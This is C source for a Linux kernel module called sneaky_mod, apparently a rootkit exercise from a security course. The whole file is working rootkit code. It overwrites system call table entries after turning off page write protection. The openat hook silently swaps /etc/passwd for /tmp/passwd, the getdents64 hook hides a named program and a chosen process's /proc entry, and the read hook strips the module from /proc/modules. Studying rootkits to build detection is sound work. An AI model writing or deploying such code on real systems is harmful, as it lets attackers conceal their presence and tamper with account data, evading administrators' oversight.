// sneaky_mod.c
#include <linux/module.h>      // for all modules 
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <asm/uaccess.h>
#include <linux/string.h>      // For string manipulation functions
#include <linux/limits.h>   
#include <linux/uaccess.h>  
#include <linux/fs.h>
#include <linux/namei.h>
#include <linux/fdtable.h> 
#include <linux/file.h>
#include <linux/syscalls.h> 
#include <linux/fs.h>


#define PREFIX "sneaky_process"

//This is a pointer to the system call table
static unsigned long* sys_call_table;
asmlinkage long (*original_getdents64)(struct pt_regs*);
asmlinkage long sneaky_getdents64(struct pt_regs* regs);
asmlinkage long (*original_read)(struct pt_regs*);
asmlinkage long sneaky_sys_read(struct pt_regs* regs);
asmlinkage long (*original_openat)(struct pt_regs*);
asmlinkage long sneaky_sys_openat(struct pt_regs* regs);


static int sneaky_pid = 0;
module_param(sneaky_pid, int, 0);
MODULE_PARM_DESC(sneaky_pid, "PID of sneaky_process to hide");

// Helper functions, turn on and off the PTE address protection mode
// for syscall_table pointer
int enable_page_rw(void* ptr) {
  unsigned int level;
  pte_t* pte = lookup_address((unsigned long)ptr, &level);
  if (pte->pte & ~_PAGE_RW) {
    pte->pte |= _PAGE_RW;
  }
  return 0;
}

int disable_page_rw(void* ptr) {
  unsigned int level;
  pte_t* pte = lookup_address((unsigned long)ptr, &level);
  pte->pte = pte->pte & ~_PAGE_RW;
  return 0;
}

// 1. Function pointer will be used to save address of the original 'openat' syscall.
// 2. The asmlinkage keyword is a GCC #define that indicates this function
//    should expect it find its arguments on the stack (not in registers).


// Define your new sneaky version of the 'openat' syscall
asmlinkage long sneaky_sys_openat(struct pt_regs *regs)
{
    const char __user *user_path = (const char __user *)regs->si;
    char path[32];
    long ret;

    // copy just enough to compare
    if (copy_from_user(path, user_path, sizeof(path)-1))
        return original_openat(regs);
    path[sizeof(path)-1] = '\0';

    // if it’s /etc/passwd, open /tmp/passwd instead
    if (strcmp(path, "/etc/passwd") == 0) {
        return do_sys_open(AT_FDCWD,
                           "/tmp/passwd",
                           regs->dx,
                           regs->r10);
    }

    // otherwise call the original
    ret = original_openat(regs);
    return ret;
}


asmlinkage long sneaky_getdents64(struct pt_regs* regs) {
  char pid_str[16]; // Buffer to store the PID string
  scnprintf(pid_str, sizeof(pid_str), "%d", sneaky_pid); // Get the current process PID as a string
  struct linux_dirent64 __user* dirent;
  struct linux_dirent64* current_dirent, * dirent_ker;
  long ret = original_getdents64(regs);
  if (ret <= 0) return ret;

  // buffer in kernel space
  dirent = (void*)regs->si;  // second arg: buffer pointer
  dirent_ker = kzalloc(ret, GFP_KERNEL);
  if (!dirent_ker) return ret;

  if (copy_from_user(dirent_ker, dirent, ret)) {
    kfree(dirent_ker);
    return ret;
  }

  long bpos = 0, new_ret = 0;
  while (bpos < ret) {
    current_dirent = (void*)((char*)dirent_ker + bpos);
    bool hide = false;

    // check name field
    char d_name[NAME_MAX + 1];
    strlcpy(d_name, current_dirent->d_name, sizeof(d_name));
    d_name[NAME_MAX] = '\0';

    // hide the executable file
    if (strcmp(d_name, PREFIX) == 0)
      hide = true;

    // hide the /proc/<pid> entry when listing /proc
    if (strcmp(d_name, pid_str) == 0)
      hide = true;

    if (!hide) {
      // keep this entry: copy it back to user buffer at new_ret
      long reclen = current_dirent->d_reclen;
      if (copy_to_user((char __user*)dirent + new_ret, current_dirent, reclen))
        break;
      new_ret += reclen;
    }
    bpos += current_dirent->d_reclen;
  }

  // zero out the rest if we removed entries
  if (new_ret < ret)
    memset((char __user*)dirent + new_ret, 0, ret - new_ret);

  kfree(dirent_ker);
  return new_ret;
}

asmlinkage long sneaky_sys_read(struct pt_regs* regs) {
  long ret = original_read(regs);
  if (ret <= 0)
    return ret;

  // fd is in regs->di, buffer in regs->si
  int fd = regs->di;
  char __user* user_buf = (char __user*)regs->si;

  // Get struct file for this fd
  struct file* f = fget(fd);
  if (!f)
    return ret;

  // Check if this is /proc/modules
  if (f->f_path.dentry->d_parent->d_name.name &&
    !strcmp(f->f_path.dentry->d_parent->d_name.name, "proc") &&
    !strcmp(f->f_path.dentry->d_name.name, "modules")) {

    // Copy data into kernel space
    char* kbuf = kzalloc(ret, GFP_KERNEL);
    if (kbuf) {
      if (!copy_from_user(kbuf, user_buf, ret)) {
        char* in = kbuf;
        char* out = kbuf;
        char* end = kbuf + ret;

        // Process line-by-line
        while (in < end) {
          char* newline = memchr(in, '\n', end - in);
          size_t len = newline ? (newline - in + 1)
            : (end - in);
          // If this line does not contain "sneaky_mod", keep it
          if (!strstr(in, "sneaky_mod")) {
            memmove(out, in, len);
            out += len;
          }
          if (!newline) break;
          in += len;
        }

        // Copy filtered data back to user buffer
        long new_ret = out - kbuf;
        if (new_ret < ret)
          memset(user_buf + new_ret, 0, ret - new_ret);
        copy_to_user(user_buf, kbuf, new_ret);
        ret = new_ret;
      }
      kfree(kbuf);
    }
  }

  fput(f);
  return ret;
}

// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void) {
  // See /var/log/syslog or use `dmesg` for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  // Lookup the address for this symbol. Returns 0 if not found.
  // This address will change after rebooting due to protection
  sys_call_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");

  // This is the magic! Save away the original 'openat' system call
  // function address. Then overwrite its address in the system call
  // table with the function address of our new code.
  enable_page_rw((void*)sys_call_table);
  original_openat = (void*)sys_call_table[__NR_openat];
  sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
  original_getdents64 = (void*)sys_call_table[__NR_getdents64];
  sys_call_table[__NR_getdents64] = (unsigned long)sneaky_getdents64;
  original_read = (void*)sys_call_table[__NR_read];
  sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;

  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void*)sys_call_table);

  return 0;       // to show a successful load 
}


static void exit_sneaky_module(void) {
  printk(KERN_INFO "Sneaky module being unloaded.\n");

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void*)sys_call_table);
  sys_call_table[__NR_openat] = (unsigned long)original_openat;
  sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
  sys_call_table[__NR_read] = (unsigned long)original_read;
  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void*)sys_call_table);
}


module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  
MODULE_LICENSE("GPL");